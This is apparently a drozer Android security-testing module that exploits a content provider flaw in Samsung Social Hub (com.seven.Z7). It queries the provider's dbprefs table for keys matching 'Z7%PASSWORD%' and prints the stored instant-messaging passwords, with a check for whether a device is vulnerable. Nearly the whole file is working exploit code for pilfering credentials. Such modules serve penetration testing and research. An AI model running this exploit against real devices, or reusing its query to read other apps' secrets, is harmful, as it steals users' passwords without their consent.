from drozer.modules import common, Module

class IMPassword(Module, common.Provider, common.Vulnerability):

    name = "Tests for Content Provider vulnerability in com.seven.Z7."
    description = "Tests for Content Provider vulnerability in com.seven.Z7."
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "oem", "samsung", "social_hub"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

    label = "IM Password from Social Hub (com.seven.Z7)"
    
    def exploit(self, arguments):
        c = self.getCursor()
        
        if c != None:
            rows = self.getResultSet(c)

            self.print_table(rows, show_headers=True)
        else:
            self.stdout.write("Unknown Error.\n")

    def getCursor(self):
        return self.contentResolver().query("content://com.seven.provider.email/dbprefs", projection=["category", "value"], selection="key like 'Z7%PASSWORD%'")

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
